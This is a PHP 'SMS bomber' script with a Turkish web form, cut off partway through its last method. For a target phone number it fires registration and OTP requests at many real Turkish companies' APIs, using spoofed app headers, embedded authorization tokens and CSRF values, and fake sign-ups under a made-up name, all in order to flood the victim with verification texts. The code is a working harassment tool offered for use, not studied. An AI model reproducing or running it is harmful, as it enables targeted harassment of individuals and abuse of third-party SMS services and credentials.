<?php
function generateRandomEmail() {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $randomString = '';
    for ($i = 0; $i < 10; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString . '@example.com';
}

?>

<!DOCTYPE html>

<!DOCTYPE html>
<html>
<head>
    <title>sms</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-image: url('');
            background-size: cover;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        form {
            background-color: rgba(255, 255, 255, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            max-width: 80%;
        }

        input[type="text"],
        input[type="email"],
        input[type="number"],
        button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <br><br>
    <form method="post" action="<?php //echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        <div class="tab-pane active" id="tc" role="tabpanel">
            <label for="Phone">Phone:</label><br>
            <input class="form-control" type="text" id="phone" name="phone" minlength="10" maxlength="10" placeholder="GSM"><br>
            <label for="email">Email:</label><br>
            <input class="form-control" type="email" id="email" name="email" placeholder="Boş bırakabilirsiniz"><br>
            <label for="Value">Adet:</label><br>
            <input class="form-control" type="number" id="Value" name="Value" min="1" placeholder="1 yazınız" required><br>
            <button type="submit" class="btn btn-outline-success btn-border" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-search"></i> gönder <span id="sorgulanumber"></span></button><br><br>
        </div>
    </form>
</body>
</html>

<?php
class SMSBot {
public $phone;
public $mail;
public $adet;

// Kahve DÜnyası
public function KahveDunyasi() {
try {
$url = "https://core.kahvedunyasi.com:443/api/users/sms/send";
$headers = array(
"User-Agent" => "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Accept" => "application/json, text/plain, */*",
"Accept-Language" => "en-US,en;q=0.5",
"Accept-Encoding" => "gzip, deflate, br",
"Page-Url" => "/kayit-ol",
"Content-Type" => "application/json;charset=utf-8",
"Positive-Client" => "kahvedunyasi",
"Positive-Client-Type" => "web",
"Store-Id" => "1",
"Origin" => "https://www.kahvedunyasi.com",
"Dnt" => "1",
"Sec-Gpc" => "1",
"Referer" => "https://www.kahvedunyasi.com/",
"Sec-Fetch-Dest" => "empty",
"Sec-Fetch-Mode" => "cors",
"Sec-Fetch-Site" => "same-site",
"Te" => "trailers",
"Connection" => "close"
);
$data = json_encode(array("mobile_number" => $this->phone, "token_type" => "register_token"));
$options = array(
"http" => array(
"header" => "Content-Type: application/json\r\n" .
"Content-Length: " . strlen($data) . "\r\n" .
"Accept-Encoding: gzip, deflate, br\r\n" .
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);
$response = json_decode($result, true);
if ($response && $response['status_code'] == 200) {
//echo "Başarılı! " . $this->phone . " --> core.kahvedunyasi.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> core.kahvedunyasi.com<br>";
}
}

// Vmf
public function Wmf() {
try {
$wmf = file_get_contents("https://www.wmf.com.tr/users/register/", false, stream_context_create(array(
"http" => array(
"method" => "POST",
"header" => "Content-type: application/x-www-form-urlencoded\r\n",
"content" => http_build_query(array(
"confirm" => "true",
"date_of_birth" => "1956-03-01",
"email" => $this->mail,
"email_allowed" => "true",
"first_name" => "Memati",
"gender" => "male",
"last_name" => "Bas",
"password" => "31ABC..abc31",
"phone" => "0" . $this->phone
)),
"timeout" => 6
)
)));
if ($wmf && strpos($http_response_header[0], "202") !== false) {
//echo "Başarılı! " . $this->phone . " --> wmf.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> wmf.com.tr<br>";
}
}

// Bim
public function Bim() {
try {
$url = "https://bim.veesk.net:443/service/v1.0/account/login";
$data = json_encode(array("phone" => $this->phone));
$options = array(
"http" => array(
"header" => "Content-Type: application/json\r\n" .
"Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$bim = file_get_contents($url, false, $context);
$bim_response = json_decode($bim, true);
if ($bim_response && $bim_response['status_code'] == 200) {
//echo "Başarılı! " . $this->phone . " --> bim.veesk.net<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> bim.veesk.net<br>";
}
}

// Englishhome
public function Englishhome() {
try {
$url = "https://www.englishhome.com:443/api/member/sendOtp";
$headers = array(
"User-Agent" => "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Accept" => "*/*",
"Accept-Language" => "en-US,en;q=0.5",
"Accept-Encoding" => "gzip, deflate, br",
"Referer" => "https://www.englishhome.com/",
"Content-Type" => "application/json",
"Origin" => "https://www.englishhome.com",
"Dnt" => "1",
"Sec-Gpc" => "1",
"Sec-Fetch-Dest" => "empty",
"Sec-Fetch-Mode" => "cors",
"Sec-Fetch-Site" => "same-origin",
"Te" => "trailers"
);
$data = json_encode(array("Phone" => "+90" . $this->phone));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" .
"Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$r_response = json_decode($r, true);
if (!$r_response["isError"]) {
//echo "Başarılı! " . $this->phone . " --> englishhome.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> englishhome.com<br>";
}
}

// Icq
public function Icq() {
try {
$url = "https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90" . $this->phone . "&platform=ios&r=796356153&smsFormatType=human";
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/x-www-form-urlencoded",
"User-Agent" => "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
"Accept-Language" => "en-US,en;q=0.9",
"Accept-Encoding" => "gzip, deflate"
);
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n",
"method" => "POST",
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$r_response = json_decode($r, true);
if ($r_response["response"]["statusCode"] == 200) {
//echo "Başarılı! " . $this->phone . " --> u.icq.net<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> u.icq.net<br>";
}
}
// Suiste
public function Suiste() {
try {
$url = "https://suiste.com:443/api/auth/code";
$headers = array(
"Accept" => "application/json",
"Content-Type" => "application/x-www-form-urlencoded; charset=utf-8",
"Accept-Encoding" => "gzip, deflate",
"Mobillium-Device-Id" => "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC",
"User-Agent" => "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4",
"Accept-Language" => "en"
);
$data = http_build_query(array("action" => "register", "gsm" => $this->phone));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" .
"Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$r_response = json_decode($r, true);
if ($r_response["code"] == "common.success") {
//echo "Başarılı! " . $this->phone . " --> suiste.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> suiste.com<br>";
}
}

// KimGbIster
public function KimGb() {
try {
$url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp";
$data = json_encode(array("msisdn" => "90" . $this->phone));
$options = array(
"http" => array(
"header" => "Content-Type: application/json\r\n" .
"Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($http_response_header[0] == "HTTP/1.1 200 OK") {
//echo "Başarılı! " . $this->phone . " --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com<br>";
}
}

// Tazi
public function Tazi() {
try {
$url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin";
$headers = array(
"Accept" => "application/json, text/plain, */*",
"Content-Type" => "application/json;charset=utf-8",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0",
"Accept-Language" => "tr-TR,tr;q=0.9",
"Authorization" => "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
);
$data = json_encode(array("cep_tel" => $this->phone, "cep_tel_ulkekod" => "90"));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" .
"Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$r_response = json_decode($r, true);
if ($r_response["kod"] == "0000") {
//echo "Başarılı! " . $this->phone . " --> mobileapiv2.tazi.tech<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> mobileapiv2.tazi.tech<br>";
}
}

// Evidea
public function Evidea() {
try {
$url = "https://www.evidea.com:443/users/register/";
$headers = array(
"Content-Type" => "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
"X-Project-Name" => "undefined",
"Accept" => "application/json, text/plain, */*",
"X-App-Type" => "akinon-mobile",
"X-Requested-With" => "XMLHttpRequest",
"Accept-Language" => "tr-TR,tr;q=0.9",
"Cache-Control" => "no-store",
"Accept-Encoding" => "gzip, deflate",
"X-App-Device" => "ios",
"Referer" => "https://www.evidea.com/",
"User-Agent" => "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
"X-Csrftoken" => "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
);
$data = "--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{$this->mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{$this->phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n";
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" .
"Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($http_response_header[0] == "HTTP/1.1 202 Accepted") {
//echo "Başarılı! " . $this->phone . " --> evidea.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> evidea.com<br>";
}
}
// Hey
public function Hey() {
try {
$url = "https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={$this->phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9";
$headers = array(
"Accept" => "application/json, text/plain, */*",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"Accept-Language" => "tr"
);
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n",
"method" => "POST",
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["IsSuccess"] === true) {
//echo "Başarılı! " . $this->phone . " --> heyapi.heymobility.tech<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> heyapi.heymobility.tech<br>";
}
}

// Bisu
public function Bisu() {
try {
$url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register";
$headers = array(
"Content-Type" => "application/x-www-form-urlencoded; charset=utf-8",
"X-Device-Platform" => "IOS",
"X-Build-Version-Name" => "9.4.0",
"Authorization" => "0561b4dd-e668-48ac-b65e-5afa99bf098e",
"X-Build-Version-Code" => "22",
"Accept" => "*/*",
"X-Device-Manufacturer" => "Apple",
"X-Device-Locale" => "en",
"X-Client-Device-Id" => "66585653-CB6A-48CA-A42D-3F266677E3B5",
"Accept-Language" => "en-US,en;q=0.9",
"Accept-Encoding" => "gzip, deflate",
"X-Device-Platform-Version" => "15.7.7",
"User-Agent" => "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"X-Device-Model" => "iPhone 7 Plus",
"X-Build-Type" => "Release"
);
$data = http_build_query(array("phoneNumber" => $this->phone));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["errors"] === null) {
//echo "Başarılı! " . $this->phone . " --> bisu.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> bisu.com.tr<br>";
}
}

// Ucdortbes
public function Ucdortbes() {
try {
$url = "https://api.345dijital.com:443/api/users/register";
$headers = array(
"Accept" => "application/json, text/plain, */*",
"Content-Type" => "application/json",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"Accept-Language" => "en-US,en;q=0.9",
"Authorization" => "null",
"Connection" => "close"
);
$data = json_encode(array(
"email" => "",
"name" => "Memati",
"phoneNumber" => "+90" . $this->phone,
"surname" => "Bas"
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["error"] === "E-Posta veya telefon zaten kayıtlı!") {
//echo "Başarılı! " . $this->phone . " --> api.345dijital.com<br>";
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.345dijital.com<br>";
$this->adet += 1;
}
}
// Macro
public function Macro() {
try {
$url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31";
$headers = array(
"User-Agent" => "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Accept" => "application/json",
"Accept-Language" => "en-US,en;q=0.5",
"Accept-Encoding" => "gzip, deflate, br",
"Referer" => "https://www.macrocenter.com.tr/kayit",
"Content-Type" => "application/json",
"X-Forwarded-Rest" => "true",
"X-Pwa" => "true",
"X-Device-Pwa" => "true",
"Origin" => "https://www.macrocenter.com.tr",
"Dnt" => "1",
"Sec-Gpc" => "1",
"Sec-Fetch-Dest" => "empty",
"Sec-Fetch-Mode" => "cors",
"Sec-Fetch-Site" => "same-origin",
"Te" => "trailers"
);
$data = json_encode(array("email" => $this->mail, "phoneNumber" => $this->phone));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["successful"] === true) {
//echo "Başarılı! " . $this->phone . " --> macrocenter.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> macrocenter.com.tr<br>";
}
}

// TiklaGelsin
public function TiklaGelsin() {
try {
$url = "https://svc.apps.tiklagelsin.com:443/user/graphql";
$headers = array(
"Content-Type" => "application/json",
"X-Merchant-Type" => "0",
"Accept" => "*/*",
"Appversion" => "2.4.1",
"Accept-Language" => "en-US,en;q=0.9",
"Accept-Encoding" => "gzip, deflate",
"X-No-Auth" => "true",
"User-Agent" => "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"X-Device-Type" => "2"
);
$data = json_encode(array(
"operationName" => "GENERATE_OTP",
"query" => "mutation GENERATE_OTP(\$phone: String, \$challenge: String, \$deviceUniqueId: String) {\n  generateOtp(phone: \$phone, challenge: \$challenge, deviceUniqueId: \$deviceUniqueId)\n}\n",
"variables" => array(
"challenge" => "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
"deviceUniqueId" => "720932D5-47BD-46CD-A4B8-086EC49F81AB",
"phone" => "+90" . $this->phone
)
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["data"]["generateOtp"] === true) {
//echo "Başarılı! " . $this->phone . " --> svc.apps.tiklagelsin.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> svc.apps.tiklagelsin.com<br>";
}
}

// Ayyildiz
public function Ayyildiz() {
try {
$url = "https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={$this->phone}";
$headers = array(
"Accept" => "*/*",
"Token" => "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
"Devicetype" => "mobileapp",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7",
"Accept-Language" => "en-TR;q=1.0, tr-TR;q=0.9"
);
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n",
"method" => "POST",
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["Success"] === true) {
//echo "Başarılı! " . $this->phone . " --> api.altinyildizclassics.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.altinyildizclassics.com<br>";
}
}

// Naosstars
public function Naosstars() {
try {
$url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350";
$headers = array(
"Uniqid" => "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
"User-Agent" => "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"Access-Control-Allow-Origin" => "*",
"Locale" => "en-TR",
"Version" => "1.0030",
"Os" => "ios",
"Apiurl" => "https://api.naosstars.com/api/",
"Device-Id" => "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
"Platform" => "ios",
"Accept-Language" => "en-US,en;q=0.9",
"Timezone" => "Europe/Istanbul",
"Globaluuidv4" => "d57bd5d2-cf1e-420c-b43d-61117cf9b517",
"Timezoneoffset" => "-180",
"Accept" => "application/json",
"Content-Type" => "application/json; charset=utf-8",
"Accept-Encoding" => "gzip, deflate",
"Apitype" => "mobile_app"
);
$data = json_encode(array("telephone" => "+90" . $this->phone, "type" => "register"));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["status_code"] == 200) {
//echo "Başarılı! " . $this->phone . " --> api.naosstars.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.naosstars.com<br>";
}
}
// Istegelsin
public function Istegelsin() {
try {
$url = "https://prod.fasapi.net:443/";
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/x-www-form-urlencoded",
"App-Version" => "2528",
"Accept-Encoding" => "gzip, deflate",
"Platform" => "IOS",
"User-Agent" => "ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"Accept-Language" => "en-US,en;q=0.9"
);
$data = http_build_query(array(
"operationName" => "SendOtp2",
"query" => "mutation SendOtp2(\$phoneNumber: String!) {\n  sendOtp2(phoneNumber: \$phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}",
"variables" => array("phoneNumber" => "90" . $this->phone)
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["data"]["sendOtp2"]["alreadySent"] === false) {
//echo "Başarılı! " . $this->phone . " --> prod.fasapi.net<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> prod.fasapi.net<br>";
}
}

// Koton
public function Koton() {
try {
$url = "https://www.koton.com:443/users/register/";
$headers = array(
"Content-Type" => "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
"X-Project-Name" => "rn-env",
"Accept" => "application/json, text/plain, */*",
"X-App-Type" => "akinon-mobile",
"X-Requested-With" => "XMLHttpRequest",
"Accept-Language" => "en-US,en;q=0.9",
"Cache-Control" => "no-store",
"Accept-Encoding" => "gzip, deflate",
"X-App-Device" => "ios",
"Referer" => "https://www.koton.com/",
"User-Agent" => "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"X-Csrftoken" => "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
);
$data = "--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{$this->mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data: form-data; name=\"phone\"\r\n\r\n0{$this->phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n";
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r === FALSE) {
throw new Exception();
}
if (strpos($http_response_header[0], "202") !== false) {
//echo "Başarılı! " . $this->phone . " --> koton.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> koton.com<br>";
}
}

// Hayatsu
public function Hayatsu() {
try {
$url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp";
$headers = array(
"User-Agent" => "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Accept" => "application/json, text/javascript, */*; q=0.01",
"Accept-Language" => "en-US,en;q=0.5",
"Accept-Encoding" => "gzip, deflate, br",
"Referer" => "https://www.hayatsu.com.tr/",
"Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8",
